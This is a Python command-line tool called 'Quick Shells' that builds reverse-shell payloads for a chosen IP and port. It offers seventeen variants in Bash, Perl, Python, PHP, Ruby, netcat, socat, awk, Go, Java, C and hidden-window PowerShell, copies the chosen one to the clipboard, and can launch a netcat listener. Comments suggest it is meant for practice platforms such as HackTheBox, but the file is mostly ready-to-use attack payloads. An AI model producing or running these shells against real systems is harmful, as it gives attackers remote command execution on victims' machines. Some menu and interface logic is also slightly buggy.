#!/usr/bin/env python3
# coding=latin-1

import ipaddress, pyfiglet
import os
from string import Template
from time import sleep
from colorama import Fore, Style
from netifaces import interfaces, ifaddresses, AF_INET
from pyperclip import copy

# Color Templates
blue = Template(Style.BRIGHT + Fore.BLUE + '$text' + Style.RESET_ALL)
yellow = Template(Style.BRIGHT + Fore.YELLOW + '$text' + Style.RESET_ALL)
red = Template(Style.BRIGHT + Fore.RED + '$text' + Style.RESET_ALL)


# Banner
def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    ascii_banner = pyfiglet.figlet_format("Quick  Shells")
    print(Style.BRIGHT + Fore.BLUE + ascii_banner + Style.RESET_ALL)
    print(blue.safe_substitute(text="[+] Generate custom reverse shell code quickly!"))

# Class for network information (e.g. IP, Port) and validation of such
class NetInfo:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def getIP(self):
        return self.ip

    def getPort(self):
        return self.port

    def validateIP(self, ip) -> bool:
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            print("\n[ERROR] Oops! The IP you entered [ {} ] is not valid, try again... \n".format(ip))
            return False

    def validatePort(self, port) -> bool:
        try:
            if int(port) in range(1, 65535) and port.isdecimal():
                return True
            else:
                print("\n[ERROR] Oops! The PORT you entered [ {} ] is either < 1 or > 65535! "
                        "Try again... \n".format(port))
                return False
        except ValueError:
            print("\n[ERROR] Oops! The PORT you entered [ {} ]  contains string characters! "
                  "Try again... \n".format(port))
            return False


# Displays available IPs based off network interfaces
# Auto-assigns tun0 as IP if selected by the user, useful for (e.g. HackTheBox, TryHackMe)
def get_ips():
    print("\n" + blue.safe_substitute(text="Available Interfaces/IPs: "))

    for iface in interfaces():
        try:
            curr_ip = ifaddresses(iface)[AF_INET][0]['addr']
            if curr_ip != '127.0.0.1':
                print(yellow.safe_substitute(text="{} : {}".format(iface, curr_ip)))
                if iface == 'en0': # change to tun0
                    return curr_ip
        except KeyError as e:
            pass


def generate_code(usr_choice, ip, port):
    shell_dict = {
        1: "bash -i >& /dev/tcp/{}/{} 0>&1".format(ip, port),
        2: "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(ip, port),
        3: "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'".format(ip, port),
        4: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'".format(ip, port),
        5: "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(ip, port),
        6: "ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(ip, port),
        7: "nc -e /bin/sh {} {}".format(ip, port),
        8: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f".format(ip, port),
        9: '''
                r = Runtime.getRuntime()
                p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
                p.waitFor()'''.format(ip, port),
        10: "xterm -display {}:{}".format(ip, port),
        11: "rm -f /tmp/p; mknod /tmp/p p && telnet ${} ${} 0/tmp/p".format(ip, port),
        12: "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"%s:%s\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" % (ip, port),
        13: "socat tcp-connect:{}:{} exec:/bin/sh,pty,stderr,setsid,sigint,sane".format(ip, port),
        14: "awk 'BEGIN {s = \"/inet/tcp/0/%s/%s\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null" % (ip, port),
        15: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""+ip+"\","+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
        16: "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'"+ip+"\',"+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
        17: '''
            #include <stdio.h>
            #include <sys/socket.h>
            #include <netinet/ip.h>
            #include <arpa/inet.h>
            #include <unistd.h>
            int main ()
            {
            const char* ip = "%s";
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(%s);
            inet_aton(ip, &addr.sin_addr);
            int sockfd = socket(AF_INET, SOCK_STREAM, 0);
            connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
            for (int i = 0; i < 3; i++)
            {
            dup2(sockfd, i);
            }
            execve("/bin/sh", NULL, NULL);
            return 0;
            }
            ''' % (ip, port)
    }

    print(blue.safe_substitute(text="\nCopied the code below to the clipboard: "))
    print(Fore.YELLOW + shell_dict.get(usr_choice))

    if usr_choice == 1:
        print(red.safe_substitute(text="\nBASH TIP: Don't forget to try adding 'bash -c' on non-default bash shells"))
    elif usr_choice == 7 or usr_choice == 8:
        print(red.safe_substitute(text="\nNETCAT TIP: Don't forget to try other versions [ Netcat / Ncat ]"))

    copy(shell_dict.get(usr_choice))


def use_netcat(net_info):
    if os.name != 'nt':
        print(yellow.safe_substitute(text="Setting up listener on port {}...".format(net_info.getPort())))
        os.system('clear')
        sleep(0.4)
        os.system('$(which ncat || nc) -lvnp ' + net_info.getPort())
    else:
        print(red.safe_substitute(text="Exiting..."))


def menu():
    global choice
    print(blue.safe_substitute(text="[+] Reverse Shell Options: "))
    print(yellow.safe_substitute(text="[1]  - Bash \t     [2]  - Perl  \t     [3] - Python"))
    print(yellow.safe_substitute(text="[4]  - Python3 \t     [5]  - PHP  \t     [6] - Ruby   "))
    print(yellow.safe_substitute(text="[7]  - Netcat (-e)   [8]  - Netcat (mkfifo)  [9] - Java  "))
    print(yellow.safe_substitute(text="[10] - xterm  \t     [11] - Telnet \t     [12] - GoLang"))
    print(yellow.safe_substitute(text="[13] - Socat \t     [14] - Awk \t     [15] - PowerShell 1"))
    print(yellow.safe_substitute(text="[16] - Powershell 2  [17] - C\t") + red.safe_substitute(text="\t     [^C]  - Exit"))

    ip = ""
    tmp = get_ips()

    if tmp != 'None':
        vpn_ip = str(input(blue.safe_substitute(text="\n[+] Use tun0 IP? [ Y / N ]: "))).lower()
        if vpn_ip == 'y':
            print(blue.safe_substitute(text="[+] IP Set to: {}".format(tmp)))
            ip = tmp
        else:
            ip = str(input("\n" + blue.safe_substitute(text="[+] Enter YOUR IP: ")))

    port = str(input(blue.safe_substitute(text="[+] Enter YOUR PORT: ")))

    loop = True
    while loop:
        try:
            choice = int(input(blue.safe_substitute(text="[+] Enter YOUR CHOICE: ")))
            if choice in range(1, 19):
                loop = False
            else:
                print("Please enter integers between [1] --> [17]")
        except ValueError:
            print("Invalid value [ {} ] entered. Please enter integers between [1] --> [17]".format(choice))

    net_info = NetInfo(ip, port)
    check_ip = net_info.validateIP(net_info.getIP())
    check_port = net_info.validatePort(net_info.getPort())

    if check_ip and check_port is True:
        generate_code(choice, ip, port)
    else:
        pass

    nc = str(input("\n" + blue.safe_substitute(text="[+] Setup netcat listener? [ Y / N ]: "))).lower()

    if nc == 'y':
        use_netcat(net_info)
    elif nc == 'n':
        pass
    else:
        print("\n" + blue.safe_substitute(text="Invalid option"))


if __name__ == "__main__":
    banner()
    try:
        menu()
        flag = True
        while flag:
            redo = input(blue.safe_substitute(text="\n[+] Generate another? [ Y / N ]: ")).lower()
            if redo == 'y':
                menu()
                pass
            elif redo == 'n':
                print(red.safe_substitute(text="\nGoodbye."))
                exit(0)
            else:
                print(red.safe_substitute(text="\nInvalid Option, try again: \n"))
                pass
    except KeyboardInterrupt:
        print(red.safe_substitute(text="  Keyboard Interrupt - Exiting..."))
        sleep(0.1)
        exit(0)
